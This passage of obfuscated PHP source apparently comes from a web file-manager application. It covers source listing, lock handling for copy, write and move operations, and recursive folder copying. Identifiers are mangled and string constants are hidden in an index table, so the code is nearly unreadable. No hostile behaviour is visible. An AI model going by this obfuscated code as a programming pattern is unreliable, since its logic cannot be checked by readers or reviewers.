$©©È„´Ù[$²ÌéÌ•[32]] = LNG($²ÌéÌ•[530]); } $©©È„´Ù[$²ÌéÌ•[532]] = $²ÌéÌ•[533]; } protected function _listAppendPathRoot(&$ÌêƒÚ À, $êÚ±âîÇ) { $ÍöÅ¬ü² =& $_SERVER[ÏéâËõ‘]; static $ÒûŠ¢²‹ = false; $à»ŒÃæ = $ÍöÅ¬ü²[12]; if ($ÌêƒÚ À[$ÍöÅ¬ü²[411]] == self::TYPE_USER) { if (defined($ÍöÅ¬ü²[475]) && $ÌêƒÚ À[$ÍöÅ¬ü²[505]] == USER_ID) { $à»ŒÃæ = LNG($ÍöÅ¬ü²[534]); if ($ÒûŠ¢²‹ === !1) { $ş‚«ä” = Model($ÍöÅ¬ü²[535])->getInfoFull(USER_ID); $ÒûŠ¢²‹ = _get($ş‚«ä”, $ÍöÅ¬ü²[536], $ÍöÅ¬ü²[12]); } if ($êÚ±âîÇ && $êÚ±âîÇ[0] == $ÒûŠ¢²‹ || !$êÚ±âîÇ && $ÌêƒÚ À[$ÍöÅ¬ü²[402]] == $ÒûŠ¢²‹) { $à»ŒÃæ = LNG($ÍöÅ¬ü²[537]); $ÌêƒÚ À[$ÍöÅ¬ü²[538]] = $ÍöÅ¬ü²[539]; } if (!$êÚ±âîÇ) { $ÌêƒÚ À[$ÍöÅ¬ü²[32]] = $à»ŒÃæ; } } else { $³ı½íÔ = Model($ÍöÅ¬ü²[513])->getInfoSimple($ÌêƒÚ À[$ÍöÅ¬ü²[505]]); $à»ŒÃæ = LNG($ÍöÅ¬ü²[540]) . $ÍöÅ¬ü²[162] . $³ı½íÔ[$ÍöÅ¬ü²[32]] . $ÍöÅ¬ü²[164]; $ÌêƒÚ À[$ÍöÅ¬ü²[541]] = array($ÍöÅ¬ü²[32] => $³ı½íÔ[$ÍöÅ¬ü²[32]], $ÍöÅ¬ü²[542] => $³ı½íÔ[$ÍöÅ¬ü²[542]], $ÍöÅ¬ü²[543] => $³ı½íÔ[$ÍöÅ¬ü²[543]]); } } else { if ($ÌêƒÚ À[$ÍöÅ¬ü²[411]] == self::TYPE_GROUP) { $³ı½íÔ = Model($ÍöÅ¬ü²[522])->getInfoSimple($ÌêƒÚ À[$ÍöÅ¬ü²[505]]); $à»ŒÃæ = $³ı½íÔ[$ÍöÅ¬ü²[32]]; } else { if ($ÌêƒÚ À[$ÍöÅ¬ü²[411]] == self::TYPE_SYSTEM) { $à»ŒÃæ = $ÍöÅ¬ü²[544]; } } } $à»ŒÃæ = $à»ŒÃæ ? $ÍöÅ¬ü²[8] . $à»ŒÃæ . $ÍöÅ¬ü²[8] : $ÍöÅ¬ü²[8]; return $à»ŒÃæ; } protected function _listAppendUser(&$£š™ƒ°î) { $““Ü¦ºò =& $_SERVER[ÏéâËõ‘]; $Ö˜«²Ğ£ = array_to_keyvalue($£š™ƒ°î, $““Ü¦ºò[12], $““Ü¦ºò[454]); $º·…ê™× = array_to_keyvalue($£š™ƒ°î, $““Ü¦ºò[12], $““Ü¦ºò[456]); $Ç¼ãÅ¼ = array_merge($Ö˜«²Ğ£, $º·…ê™×); $•Æı†ˆ¥ = Model($““Ü¦ºò[535])->userListInfo($Ç¼ãÅ¼); foreach ($£š™ƒ°î as &$ß•ÀŒæ²) { $ÒË ò–° = $ß•ÀŒæ²[$““Ü¦ºò[454]]; $ß•ÀŒæ²[$““Ü¦ºò[454]] = $•Æı†ˆ¥[$ÒË ò–°] ? $•Æı†ˆ¥[$ÒË ò–°] : !1; $ÒË ò–° = $ß•ÀŒæ²[$““Ü¦ºò[456]]; $ß•ÀŒæ²[$““Ü¦ºò[456]] = $•Æı†ˆ¥[$ÒË ò–°] ? $•Æı†ˆ¥[$ÒË ò–°] : !1; if (isset($ß•ÀŒæ²[$““Ü¦ºò[466]]) && $ß•ÀŒæ²[$““Ü¦ºò[466]][$““Ü¦ºò[545]]) { $İ¹Úïµ¿ = $GLOBALS[$““Ü¦ºò[6]][$““Ü¦ºò[89]][$““Ü¦ºò[546]]; if ($ß•ÀŒæ²[$““Ü¦ºò[466]][$““Ü¦ºò[547]] <= time() - $İ¹Úïµ¿) { $this->metaSet($ß•ÀŒæ²[$““Ü¦ºò[402]], $““Ü¦ºò[545], null); $this->metaSet($ß•ÀŒæ²[$““Ü¦ºò[402]], $““Ü¦ºò[547], null); unset($ß•ÀŒæ²[$““Ü¦ºò[466]][$““Ü¦ºò[545]]); continue; } $âğû¼£ö = $ß•ÀŒæ²[$““Ü¦ºò[466]][$““Ü¦ºò[545]]; $ß•ÀŒæ²[$““Ü¦ºò[466]][$““Ü¦ºò[548]] = Model($““Ü¦ºò[535])->getInfoSimpleOuter($âğû¼£ö); } } unset($ß•ÀŒæ²); } public function parentLevelArray($ÎÜÓª¥Á) { $‡¥­Š¾ƒ =& $_SERVER[ÏéâËõ‘]; $ÎÜÓª¥Á = explode($‡¥­Š¾ƒ[50], trim($ÎÜÓª¥Á, $‡¥­Š¾ƒ[50])); return array_remove_value($ÎÜÓª¥Á, $‡¥­Š¾ƒ[197]); } public function listAll($ƒ©ÅÄäã) { $Ã á»™ =& $_SERVER[ÏéâËõ‘]; $—Ëšå£¯ = $this->sourceInfo($ƒ©ÅÄäã); $®¶ÆÊĞª = array($Ã á»™[549] => array($Ã á»™[550], $—Ëšå£¯[$Ã á»™[521]] . $ƒ©ÅÄäã . $Ã á»™[551]), $Ã á»™[552] => 0); $õçÑ©Ë = $Ã á»™[553]; $‘—àšÃœ = "\114\105\x46\x54\x20\112\x4f\x49\x4e\40{$this->tablePrefix}\x69\157\x5f\146\x69\x6c\x65\x20\x66\x69\154\145\x20\x6f\x6e\40\163\x6f\165\x72\x63\145\56\x66\151\x6c\145\111\104\x20\x3d\40\x66\151\x6c\145\x2e\146\x69\154\145\111\x44"; $¸ˆÙİâ = $this->alias($Ã á»™[446])->field($õçÑ©Ë)->where($®¶ÆÊĞª)->join($‘—àšÃœ)->select(); $this->_listAppendAuth($¸ˆÙİâ); $this->_listAppendUser($¸ˆÙİâ); $this->_listAppendPath($¸ˆÙİâ); $¸ˆÙİâ = array_to_keyvalue($¸ˆÙİâ, $Ã á»™[402]); $åé½î›² = "\57{$—Ëšå£¯[$Ã á»™[32]]}\57"; $åé½î›² = $åé½î›² == $Ã á»™[529] ? $Ã á»™[8] : $åé½î›²; $Ë•íû»” = array(); foreach ($¸ˆÙİâ as $Í¸¸ªïç => $ÑåÍ·¹Å) { $òíÁç¶Œ = $this->parentLevelArray($ÑåÍ·¹Å[$Ã á»™[521]]); array_shift($òíÁç¶Œ); $ç£™ãÍÕ = $åé½î›²; for ($³ªÙÄÂ = 0; $³ªÙÄÂ < count($òíÁç¶Œ); $³ªÙÄÂ++) { $ç£™ãÍÕ .= $¸ˆÙİâ[$òíÁç¶Œ[$³ªÙÄÂ]][$Ã á»™[32]] . $Ã á»™[8]; } $ç£™ãÍÕ .= $ÑåÍ·¹Å[$Ã á»™[32]]; if ($ÑåÍ·¹Å[$Ã á»™[410]]) { $ç£™ãÍÕ .= $Ã á»™[8]; } $ç£™ãÍÕ = str_replace($Ã á»™[529], $Ã á»™[8], $ç£™ãÍÕ); $ç£™ãÍÕ = str_replace($Ã á»™[529], $Ã á»™[8], $ç£™ãÍÕ); $À÷ƒË … = array($Ã á»™[421] => str_replace($Ã á»™[529], $Ã á»™[8], $ç£™ãÍÕ), $Ã á»™[554] => intval($ÑåÍ·¹Å[$Ã á»™[410]]), $Ã á»™[86] => $this->pathInfoFilter($ÑåÍ·¹Å)); if (!$ÑåÍ·¹Å[$Ã á»™[410]]) { $À÷ƒË …[$Ã á»™[468]] = $ÑåÍ·¹Å[$Ã á»™[468]]; $À÷ƒË …[$Ã á»™[87]] = $ÑåÍ·¹Å[$Ã á»™[84]]; } $Ë•íû»”[] = $À÷ƒË …; } return $Ë•íû»”; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($ãÚ¯Íû) { $«ššŞÈÓ =& $_SERVER[ÏéâËõ‘]; if (!$this->allowLock()) { return; } $this->_lockCheck($«ššŞÈÓ[555], $ãÚ¯Íû); $«ø½¸õ = 1; $this->_lockEvent($ãÚ¯Íû, array($«ššŞÈÓ[556], $«ššŞÈÓ[557]), $«ø½¸õ); $this->_lockParent($ãÚ¯Íû, array($«ššŞÈÓ[557]), $«ø½¸õ); $this->_lockEvent($ãÚ¯Íû, array($«ššŞÈÓ[558], $«ššŞÈÓ[559]), $«ø½¸õ); $this->_lockCheckEnd($«ššŞÈÓ[555], $ãÚ¯Íû); } public function lockCopyEnd($Ü•¤×åŸ) { $¬ó»©ü° =& $_SERVER[ÏéâËõ‘]; if (!$this->allowLock()) { return; } $Œ®±Š = 0; $this->_lockEvent($Ü•¤×åŸ, array($¬ó»©ü°[556], $¬ó»©ü°[557]), $Œ®±Š); $this->_lockParent($Ü•¤×åŸ, array($¬ó»©ü°[557]), $Œ®±Š); $this->_lockEvent($Ü•¤×åŸ, array($¬ó»©ü°[558], $¬ó»©ü°[559]), $Œ®±Š); } public function lockWriteStart($¿âûÜ†¤, $ÅÑ‘± = '') { $Šéœì£ =& $_SERVER[ÏéâËõ‘]; if (!$this->allowLock()) { return; } $this->_lockCheck($Šéœì£[556], $¿âûÜ†¤); $Ì´¨©—  = 1; $this->_lockKey($Šéœì£[560] . $¿âûÜ†¤ . $Šéœì£[10] . $ÅÑ‘±, $Ì´¨©— ); $this->_lockEvent($¿âûÜ†¤, array($Šéœì£[555], $Šéœì£[557]), $Ì´¨©— ); $this->_lockParent($¿âûÜ†¤, array($Šéœì£[555], $Šéœì£[557]), $Ì´¨©— ); $this->_lockCheckEnd($Šéœì£[556], $¿âûÜ†¤); } public function lockWriteEnd($×şø¼¬º, $£²Ü¶ = '') { $ ²¾™ÌÜ =& $_SERVER[ÏéâËõ‘]; if (!$this->allowLock()) { return; } $¶ìÏËàÈ = 0; $this->_lockKey($ ²¾™ÌÜ[560] . $×şø¼¬º . $ ²¾™ÌÜ[10] . $£²Ü¶, $¶ìÏËàÈ); $this->_lockEvent($×şø¼¬º, array($ ²¾™ÌÜ[555], $ ²¾™ÌÜ[557]), $¶ìÏËàÈ); $this->_lockParent($×şø¼¬º, array($ ²¾™ÌÜ[555], $ ²¾™ÌÜ[557]), $¶ìÏËàÈ); } public function lockMoveStart($é¯ĞäòÆ) { $ì™Õ÷şá =& $_SERVER[ÏéâËõ‘]; if (!$this->allowLock()) { return; } $this->_lockCheck($ì™Õ÷şá[557], $é¯ĞäòÆ); $“Ö³ˆƒ² = 1; $this->_lockKey($ì™Õ÷şá[561] . $é¯ĞäòÆ, $“Ö³ˆƒ²); $this->_lockEvent($é¯ĞäòÆ, array($ì™Õ÷şá[555], $ì™Õ÷şá[556]), $“Ö³ˆƒ²); $this->_lockParent($é¯ĞäòÆ, array($ì™Õ÷şá[555], $ì™Õ÷şá[557]), $“Ö³ˆƒ²); $this->_lockEvent($é¯ĞäòÆ, array($ì™Õ÷şá[562], $ì™Õ÷şá[558], $ì™Õ÷şá[559]), $“Ö³ˆƒ²); $this->_lockCheckEnd($ì™Õ÷şá[557], $é¯ĞäòÆ); } public function lockMoveEnd($¼÷ë®éî) { $Ø®‰Ú·ş =& $_SERVER[ÏéâËõ‘]; if (!$this->allowLock()) { return; } $Ÿ³†¤ÏÒ = 0; $this->_lockKey($Ø®‰Ú·ş[561] . $¼÷ë®éî, $Ÿ³†¤ÏÒ); $this->_lockEvent($¼÷ë®éî, array($Ø®‰Ú·ş[555], $Ø®‰Ú·ş[556]), $Ÿ³†¤ÏÒ); $this->_lockParent($¼÷ë®éî, array($Ø®‰Ú·ş[555], $Ø®‰Ú·ş[557]), $Ÿ³†¤ÏÒ); $this->_lockEvent($¼÷ë®éî, array($Ø®‰Ú·ş[562], $Ø®‰Ú·ş[558], $Ø®‰Ú·ş[559]), $Ÿ³†¤ÏÒ); } private function _lockCheck($Ç’¯ú‰ù, $ßş‚óÒ¥) { $ş¸ÎİˆÅ =& $_SERVER[ÏéâËõ‘]; $ÅÔàê = $this->sourceInfo($ßş‚óÒ¥); $”†ì¢õè = $Ç’¯ú‰ù . $ş¸ÎİˆÅ[10] . $ßş‚óÒ¥; $this->_lockTimeStart[$”†ì¢õè] = timeFloat(); if (!is_array($ÅÔàê)) { return; } $š×ì‹°¯ = LNG($ş¸ÎİˆÅ[563]); CacheLock::setErrorMsg($ş¸ÎİˆÅ[162] . htmlspecialchars($ÅÔàê[$ş¸ÎİˆÅ[32]]) . $ş¸ÎİˆÅ[164] . $š×ì‹°¯); $this->_lockKey($”†ì¢õè, 1); $this->_lockKey($”†ì¢õè, 0); $×—ˆØá½ = array_reverse($this->parentLevelArray($ÅÔàê[$ş¸ÎİˆÅ[521]])); foreach ($×—ˆØá½ as $‚”çœÏµ) { $”†ì¢õè = $Ç’¯ú‰ù . $ş¸ÎİˆÅ[564] . $‚”çœÏµ; if (CacheLock::lockGet($ş¸ÎİˆÅ[565] . $”†ì¢õè)) { $ÅÔàê = $this->sourceInfo($‚”çœÏµ); CacheLock::setErrorMsg($ş¸ÎİˆÅ[162] . htmlspecialchars($ÅÔàê[$ş¸ÎİˆÅ[32]]) . $ş¸ÎİˆÅ[164] . $š×ì‹°¯); $this->_lockKey($”†ì¢õè, 1); $this->_lockKey($”†ì¢õè, 0); } } } private function _lockCheckEnd($”äÍùÁŠ, $Ç§óÄ³İ) { $Ç·ƒºÄ =& $_SERVER[ÏéâËõ‘]; $§¹ÃõÜ© = $”äÍùÁŠ . $Ç·ƒºÄ[10] . $Ç§óÄ³İ; CacheLock::setErrorMsg($Ç·ƒºÄ[378]); if (!isset($this->_lockTimeStart[$§¹ÃõÜ©])) { return; } $öî»ñÒ = timeFloat() - $this->_lockTimeStart[$§¹ÃõÜ©]; unset($this->_lockTimeStart[$§¹ÃõÜ©]); if ($öî»ñÒ > 0.5) { unset(self::$cacheSourceInfo[$Ç·ƒºÄ[460] . $Ç§óÄ³İ]); } $‡²€Õèƒ = $this->sourceInfo($Ç§óÄ³İ); if (!$‡²€Õèƒ) { show_json(LNG($Ç·ƒºÄ[105]), !1); } } private function _lockParent($ÀäÏ“î™, $ÒËöà…È, $ø¸ó’ŠÏ) { if (!$this->autoLockSet) { return; } $ıúûêÆµ = $this->sourceInfo($ÀäÏ“î™); if (!is_array($ıúûêÆµ)) { return; } $˜±£ºÅ” = array_reverse($this->parentLevelArray($ıúûêÆµ[$_SERVER[ÏéâËõ‘][521]])); foreach ($˜±£ºÅ” as $¶ãŸæ») { $this->_lockEvent($¶ãŸæ», $ÒËöà…È, $ø¸ó’ŠÏ); } } private function _lockEvent($©¢÷«¥, $‰¡¬Úµ, $Œí—È»™) { $§‚ïšƒ =& $_SERVER[ÏéâËõ‘]; if (!$this->autoLockSet) { return; } foreach ($‰¡¬Úµ as $´¢Ò·Ó´) { $ Ğ®ˆò© = $´¢Ò·Ó´ . $§‚ïšƒ[10] . $©¢÷«¥; if ($Œí—È»™ && CacheLock::lockGet($§‚ïšƒ[565] . $ Ğ®ˆò©)) { continue; } $this->_lockKey($ Ğ®ˆò©, $Œí—È»™); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($®Ä©è¢’, $Ô‚Ï”— = 1) { $µ£×æá¡ = $_SERVER[ÏéâËõ‘][565] . md5($®Ä©è¢’); if ($Ô‚Ï”—) { if (isset(self::$_lockItemArr[$µ£×æá¡])) { return; } self::$_lockItemArr[$µ£×æá¡] = 1; CacheLock::lock($µ£×æá¡, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$µ£×æá¡])) { return; } unset(self::$_lockItemArr[$µ£×æá¡]); CacheLock::unlock($µ£×æá¡); } } public function isParentOf($ò¿¾«·û, $É¯æ©›ğ) { $ÓËéÌ¿Ó =& $_SERVER[ÏéâËõ‘]; $²ß¯™‘ = $this->sourceInfo($ò¿¾«·û); $Óëˆ´µˆ = $this->sourceInfo($É¯æ©›ğ); $Õ÷¸ÂƒÈ = $²ß¯™‘[$ÓËéÌ¿Ó[521]] . $²ß¯™‘[$ÓËéÌ¿Ó[402]] . $ÓËéÌ¿Ó[50]; $´¢Å‚ç‘ = $Óëˆ´µˆ[$ÓËéÌ¿Ó[521]] . $Óëˆ´µˆ[$ÓËéÌ¿Ó[402]] . $ÓËéÌ¿Ó[50]; $ïŞ¢‹öš = strpos($´¢Å‚ç‘, $Õ÷¸ÂƒÈ) === 0; return $ïŞ¢‹öš; } private $targetIsDelete = 0; public function copy($Œ¤×ãó, $‹”‹øıĞ, $İ€âÂ­ş = REPEAT_REPLACE, $÷±¦Æ×é = '') { $Ô’°„·è =& $_SERVER[ÏéâËõ‘]; $­ƒ„©ëó = $this->sourceInfo($Œ¤×ãó); $ú›¬Èø¦ = $this->sourceInfo($‹”‹øıĞ); if (!$­ƒ„©ëó || !$ú›¬Èø¦ || $ú›¬Èø¦[$Ô’°„·è[410]] != $Ô’°„·è[88]) { return !1; } if ($this->isParentOf($Œ¤×ãó, $‹”‹øıĞ)) { return !1; } $®¥œ½ = $÷±¦Æ×é ? $÷±¦Æ×é : $­ƒ„©ëó[$Ô’°„·è[32]]; $this->lockCopyStart($Œ¤×ãó); $this->lockWriteStart($‹”‹øıĞ, $®¥œ½); $£Ş¦®™È = array($Ô’°„·è[566] => array(), $Ô’°„·è[567] => array(), $Ô’°„·è[568] => array()); $this->targetIsDelete = intval($­ƒ„©ëó[$Ô’°„·è[431]]); $¥¼®ªşî = $this->fileNameExistCache($‹”‹øıĞ, $­ƒ„©ëó[$Ô’°„·è[32]]); $‹Û¨ù±« = $this->_copy($Œ¤×ãó, $‹”‹øıĞ, $İ€âÂ­ş, $£Ş¦®™È, !0, $÷±¦Æ×é); $this->_childrenListClear(); $this->lockCopyEnd($Œ¤×ãó); $this->lockWriteEnd($‹”‹øıĞ, $®¥œ½); if ($­ƒ„©ëó[$Ô’°„·è[410]] == $Ô’°„·è[88] && $¥¼®ªşî == $‹Û¨ù±«) { $this->folderSizeResetChildren($¥¼®ªşî); } Model($Ô’°„·è[569])->addAll($£Ş¦®™È[$Ô’°„·è[567]], array(), !0); if ($¥¼®ªşî != $‹Û¨ù±« || $­ƒ„©ëó[$Ô’°„·è[410]] == $Ô’°„·è[88]) { Model($Ô’°„·è[570])->eventCopy($‹Û¨ù±«); } $this->saveAll($£Ş¦®™È[$Ô’°„·è[568]]); Model($Ô’°„·è[199])->linkAdd($£Ş¦®™È[$Ô’°„·è[566]]); $this->folderSizeReset($‹”‹øıĞ); $this->updateModifyTime($‹”‹øıĞ); return $‹Û¨ù±«; } private function _copy($šê‹¯², $ü£²ê¸¯, $Ò…Ğ÷Øõ, &$ªùÕÖøå, $è°üü³í, $Ì±¿æ¨ = '') { $ËËô’¤• =& $_SERVER[ÏéâËõ‘]; $ŞÆÓìá = $this->sourceInfoCache($šê‹¯²); $ÄãÎæî = $ŞÆÓìá[$ËËô’¤•[410]] == $ËËô’¤•[88]; $›õ–’ßè = $Ì±¿æ¨ ? $Ì±¿æ¨ : $ŞÆÓìá[$ËËô’¤•[32]]; $«Ù³ŒÁ† = $this->fileNameExistCache($ü£²ê¸¯, $›õ–’ßè); if ($è°üü³í) { $this->_childrenAllMake($šê‹¯²); if ($ÄãÎæî && $«Ù³ŒÁ†) { $this->_childrenAllMake($«Ù³ŒÁ†); } } if (!$«Ù³ŒÁ†) { return $this->_copyCreate($šê‹¯², $ü£²ê¸¯, $›õ–’ßè, $ªùÕÖøå); } $³ı¯¢Ïˆ = $«Ù³ŒÁ†; if ($ÄãÎæî) { if ($Ò…Ğ÷Øõ == REPEAT_RENAME_FOLDER) { $›õ–’ßè = $this->fileNameAutoCache($ü£²ê¸¯, $›õ–’ßè, $Ò…Ğ÷Øõ, $ÄãÎæî); $³ı¯¢Ïˆ = $this->_copyCreate($šê‹¯², $ü£²ê¸¯, $›õ–’ßè, $ªùÕÖøå); } else { $šçÈµøŞ = $this->_childrenList($šê‹¯²); foreach ($šçÈµøŞ as $ÊœœÒÊò) { $this->_copy($ÊœœÒÊò[$ËËô’¤•[402]], $«Ù³ŒÁ†, $Ò…Ğ÷Øõ, $ªùÕÖøå, !1); } } } else { if ($Ò…Ğ÷Øõ == REPEAT_RENAME || $Ò…Ğ÷Øõ == REPEAT_RENAME_FOLDER) { $›õ–’ßè = $this->fileNameAutoCache($ü£²ê¸¯, $›õ–’ßè, $Ò…Ğ÷Øõ, $ÄãÎæî); $³ı¯¢Ïˆ = $this->_copyCreate($šê‹¯², $ü£²ê¸¯, $›õ–’ßè, $ªùÕÖøå); } else { if ($Ò…Ğ÷Øõ == REPEAT_REPLACE) { $™˜ÈªŒ¡ = $this->sourceInfoCache($«Ù³ŒÁ†); $´ÛÍÇÊ = $this->fileHistory($™˜ÈªŒ¡, $ŞÆÓìá[$ËËô’¤•[468]], $ŞÆÓìá[$ËËô’¤•[76]]); if ($´ÛÍÇÊ) { $ªùÕÖøå[$ËËô’¤•[566]][] = $ŞÆÓìá[$ËËô’¤•[468]]; } } else { if ($Ò…Ğ÷Øõ == REPEAT_SKIP) { } } } Hook::trigger($ËËô’¤•[571], array($ËËô’¤•[572], $ŞÆÓìá, 0)); } return $³ı¯¢Ïˆ; } private function _copyCreate($…®Á‹ëì, $Á±ıŒï–, $À°Ø˜œõ, &$“Æ˜Ëš) { $­óÃÜø§ =& $_SERVER[ÏéâËõ‘]; $ò•ß…÷ç = $this->sourceInfoCache($…®Á‹ëì); $­ÌŠÈú = $this->sourceInfoCache($Á±ıŒï–); $“Ö±ÄÊÈ = $this->_makeItemData($ò•ß…÷ç, $­ÌŠÈú, $À°Ø˜œõ); Hook::trigger($­óÃÜø§[573], $“Ö±ÄÊÈ); Hook::trigger($­óÃÜø§[574], array($­óÃÜø§[575], $“Ö±ÄÊÈ, 0)); $Ìí‚É¿˜ = $this->add($“Ö±ÄÊÈ); $¦½¢ÏìÄ = array($­óÃÜø§[402] => $Ìí‚É¿˜, $­óÃÜø§[32] => $À°Ø˜œõ); $this->_copyApplyMeta($¦½¢ÏìÄ, $“Æ˜Ëš); if ($ò•ß…÷ç[$­óÃÜø§[410]] != $­óÃÜø§[88]) { $“Æ˜Ëš[$­óÃÜø§[566]][] = $ò•ß…÷ç[$­óÃÜø§[468]]; return $Ìí‚É¿˜; } $é×–Áô¼ = array(); $—ç†Ú« = array(); $this->_childrenListAll($…®Á‹ëì, $é×–Áô¼); $ç‹ÏÄ‡÷ = count($é×–Áô¼); if ($ç‹ÏÄ‡÷ == 0) { return $Ìí‚É¿˜; } $‚©™®ü = $this->sourceInfo($Ìí‚É¿˜); foreach ($é×–Áô¼ as $ôã‘Ã¢) { $‹êò±Š = $this->_makeItemData($ôã‘Ã¢, $‚©™®ü, $ôã‘Ã¢[$­óÃÜø§[32]]); $‹êò±Š[$­óÃÜø§[521]] = $ôã‘Ã¢[$­óÃÜø§[521]]; $—ç†Ú«[] = $‹êò±Š; } $this->chunkEventSet($­óÃÜø§[576], array($­óÃÜø§[577], $“Ö±ÄÊÈ, $ç‹ÏÄ‡÷)); $this->addAll($—ç†Ú«, array(), !1); $ÇÂ³‡ŞÙ = $this->where(array($­óÃÜø§[432] => $Ìí‚É¿˜))->select(); $ìÖ¸ô¯Â = $this->_childrenMakeRelation($é×–Áô¼, $ÇÂ³‡ŞÙ); $ìÖ¸ô¯Â[$…®Á‹ëì] = $Ìí‚É¿˜; $‹¶ÎÑ¢Ş = array(); $£¡˜‚û = array(); foreach ($ÇÂ³‡ŞÙ as $ôã‘Ã¢) { $û·ÃŞÑş = $ôã‘Ã¢[$­óÃÜø§[402]]; $¦·“ïšä = $this->_childrenMatch($ìÖ¸ô¯Â, $ôã‘Ã¢, $‚©™®ü); $‹¶ÎÑ¢Ş[] = array($­óÃÜø§[402], $û·ÃŞÑş, $­óÃÜø§[432], $¦·“ïšä[$­óÃÜø§[432]]); $£¡˜‚û[] = array($­óÃÜø§[402], $û·ÃŞÑş, $­óÃÜø§[521], $¦·“ïšä[$­óÃÜø§[521]]); $this->_copyApplyMeta($ôã‘Ã¢, $“Æ˜Ëš); if ($ôã‘Ã¢[$­óÃÜø§[410]] != $­óÃÜø§[88]) { $“Æ˜Ëš[$­óÃÜø§[566]][] = $ôã‘Ã¢[$­óÃÜø§[468]]; } } $this->chunkEventSet($­óÃÜø§[578], array($­óÃÜø§[579], $“Ö±ÄÊÈ, $ç‹ÏÄ‡÷)); $this->saveAll($‹¶ÎÑ¢Ş); $this->chunkEventSet($­óÃÜø§[580], array($­óÃÜø§[581], $“Ö±ÄÊÈ, $ç‹ÏÄ‡÷)); $this->saveAll($£¡˜‚û); return $Ìí‚É¿˜; } private function _childrenMakeRelation($·“å©¡‚, $Ä‡óµ‹) { $¾õï¤îœ =& $_SERVER[ÏéâËõ‘]; $İäÙàí = array(); $Ø±µµß’ = array(); foreach ($·“å©¡‚ as $«Ã¨¢ÀÀ) { $–€Àù¦ = $«Ã¨¢ÀÀ[$¾õï¤îœ[32]] . $¾õï¤îœ[8] . $«Ã¨¢ÀÀ[$¾õï¤îœ[521]]; $İäÙàí[$–€Àù¦] = $«Ã¨¢ÀÀ[$¾õï¤îœ[402]]; } foreach ($Ä‡óµ‹ as $«Ã¨¢ÀÀ) { $–€Àù¦ = $«Ã¨¢ÀÀ[$¾õï¤îœ[32]] . $¾õï¤îœ[8] . $«Ã¨¢ÀÀ[$¾õï¤îœ[521]]; $±¼Ø•ÙŒ = $İäÙàí[$–€Àù¦]; $Ø±µµß’[$±¼Ø•ÙŒ] = $«Ã¨¢ÀÀ[$¾õï¤îœ[402]]; } return $Ø±µµß’; } private function _childrenMatch($¯§ÂÜÆÃ, $ù¡µ‹¾, $éÔÖ–şƒ) { $Ã§™Êá =& $_SERVER[ÏéâËõ‘]; $¹Õ„¿»œ = $éÔÖ–şƒ[$Ã§™Êá[521]]; $üäÅÓƒ´ = $this->parentLevelArray($ù¡µ‹¾[$Ã§™Êá[521]]); foreach ($üäÅÓƒ´ as $¾©Ú“‘) { if (isset($¯§ÂÜÆÃ[$¾©Ú“‘])) { $¹Õ„¿»œ .= $¯§ÂÜÆÃ[$¾©Ú“‘] . $Ã§™Êá[582]; } } $¹Õ„¿»œ = rtrim($¹Õ„¿»œ, $Ã§™Êá[50]) . $Ã§™Êá[50]; $Ñààèä¥ = $this->parentLevelArray($¹Õ„¿»œ); $–Ôñ«ÔŞ = $Ñààèä¥[count($Ñààèä¥) - 1]; return array($Ã§™Êá[432] => $–Ôñ«ÔŞ, $Ã§™Êá[521] => $¹Õ„¿»œ); } private function _makeItemData($¯áùÅ°’, $‚œœêò–, $İâ®Òõ) { $®·šÁŸ— =& $_SERVER[ÏéâËõ‘]; $­“â–Ÿœ = array($®·šÁŸ—[583] => $¯áùÅ°’[$®·šÁŸ—[410]], $®·šÁŸ—[420] => $İâ®Òõ, $®·šÁŸ—[584] => $¯áùÅ°’[$®·šÁŸ—[412]] ? $¯áùÅ°’[$®·šÁŸ—[412]] : $®·šÁŸ—[12], $®·šÁŸ—[469] => $¯áùÅ°’[$®·šÁŸ—[468]] ? $¯áùÅ°’[$®·šÁŸ—[468]] : 0, $®·šÁŸ—[585] => $¯áùÅ°’[$®·šÁŸ—[76]] ? $¯áùÅ°’[$®·šÁŸ—[76]] : 0, $®·šÁŸ—[586] => intval($‚œœêò–[$®·šÁŸ—[411]]), $®·šÁŸ—[587] => intval($‚œœêò–[$®·šÁŸ—[505]]), $®·šÁŸ—[588] => intval(USER_ID), $®·šÁŸ—[589] => intval(USER_ID), $®·šÁŸ—[401] => intval($‚œœêò–[$®·šÁŸ—[402]]), $®·šÁŸ—[590] => $‚œœêò–[$®·šÁŸ—[521]] . $‚œœêò–[$®·šÁŸ—[402]] . $®·šÁŸ—[50], $®·šÁŸ—[424] => $¯áùÅ°’[$®·šÁŸ—[85]] ? $¯áùÅ°’[$®·šÁŸ—[85]] : time(), $®·šÁŸ—[430] => 0, $®·šÁŸ—[591] => $®·šÁŸ—[12]); return $­“â–Ÿœ; } private function _copyApplyMeta($‘¾Ó³Ó‡, &$“û¨Ÿ’û) { $áÕß¥´ =& $_SERVER[ÏéâËõ‘]; $¿ÂÀƒ³ì = $‘¾Ó³Ó‡[$áÕß¥´[402]]; $ñ”óˆÔë = $‘¾Ó³Ó‡[$áÕß¥´[32]]; if (!isset($‘¾Ó³Ó‡[$áÕß¥´[592]]) || !$‘¾Ó³Ó‡[$áÕß¥´[592]] || $‘¾Ó³Ó‡[$áÕß¥´[592]] == $áÕß¥´[197]) { $“û¨Ÿ’û[$áÕß¥´[568]][] = array($áÕß¥´[402], $¿ÂÀƒ³ì, $áÕß¥´[592], short_id($¿ÂÀƒ³ì)); } if (Input::check($ñ”óˆÔë, $áÕß¥´[593])) { $“û¨Ÿ’û[$áÕß¥´[567]][] = array($áÕß¥´[402] => $¿ÂÀƒ³ì, $áÕß¥´[94] => $áÕß¥´[465], $áÕß¥´[374] => str_replace($áÕß¥´[53], $áÕß¥´[12], Pinyin::get($ñ”óˆÔë))); $“û¨Ÿ’û[$áÕß¥´[567]][] = array($áÕß¥´[402] => $¿ÂÀƒ³ì, $áÕß¥´[94] => $áÕß¥´[464], $áÕß¥´[374] => Pinyin::get($ñ”óˆÔë, $áÕß¥´[594])); } $“û¨Ÿ’û[$áÕß¥´[567]][] = array($áÕß¥´[402] => $¿ÂÀƒ³ì, $áÕß¥´[94] => $áÕß¥´[444], $áÕß¥´[374] => KodSort::makeStr($ñ”óˆÔë)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($­èÄµ™¬) { $‘“‰Ğşï =& 